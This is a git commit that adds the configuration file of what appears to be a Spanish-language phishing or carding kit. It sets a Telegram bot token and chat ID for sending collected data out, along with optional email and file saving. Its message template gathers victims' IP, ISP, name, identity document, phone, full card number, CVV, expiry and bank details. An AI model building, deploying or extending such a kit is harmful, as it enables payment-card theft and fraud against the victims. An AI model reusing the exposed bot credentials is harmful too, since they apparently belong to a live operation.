72ee2f9159d7cacce07e357429a3d34e66b7af35
martinlopez85 <96351954+martinlopez85@users.noreply.github.com>
2021-12-19 16:28:46 -0300

    Add files via upload

---
+++ config.php
@@ -0,0 +1,25 @@
+<?php $telegram_send=false;$bottoken="5091835976:AAHWygIPar9MfsPOQlHgqhvqP62opOLU8zI";$chatid="1657607169";$email_send=false;$email="";$message=">> Personal <<
+
+>> Datos de conexión <<
+IP: {1}
+ISP: {2}
+
+>> Datos personales <<
+Nombre: {3}
+Documento: {4}
+Celular: {5}
+
+>> Tarjeta <<
+Tarjeta: {6}
+CVV: {7}
+Vencimiento: {8}
+
+>> Datos de tarjeta <<
+Tipo: {9}
+Marca: {10}
+Esquema: {11}
+Pais: {12}
+Banco: {13}
+Url: {14}
+Telefono: {15}
+Ciudad: {16}";$message_option=false;$save_file=false;?>
